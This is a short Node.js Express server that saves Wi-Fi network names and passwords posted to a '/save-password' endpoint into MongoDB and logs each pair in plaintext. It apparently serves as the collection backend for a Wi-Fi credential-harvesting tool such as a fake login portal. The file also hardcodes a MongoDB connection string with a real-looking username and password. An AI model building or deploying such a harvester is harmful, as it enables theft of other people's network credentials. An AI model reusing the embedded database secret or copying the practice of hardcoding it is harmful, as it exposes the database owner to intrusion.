const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();

app.use(express.json());
app.use(cors());

const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://kamranikramofficial_db_user:ZdeTxLAUP0doX2uP@portfolio-website.2chacsp.mongodb.net/pakautose?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI)
  .then(() => console.log("✅ MongoDB Connected"))
  .catch(err => console.error("❌ MongoDB Connection Error:", err));

const PasswordSchema = new mongoose.Schema({
  ssid: String,
  password: String,
  timestamp: { type: Date, default: Date.now }
});

const Password = mongoose.model('Password', PasswordSchema);

app.post('/save-password', async (req, res) => {
  try {
    const { ssid, password } = req.body;
    
    if (!ssid || !password) {
      return res.status(400).json({ error: "SSID and Password required" });
    }

    await Password.create({ ssid, password });
    console.log(`💾 Saved → ${ssid} : ${password}`);
    
    res.status(200).json({ success: true, message: "Password saved successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
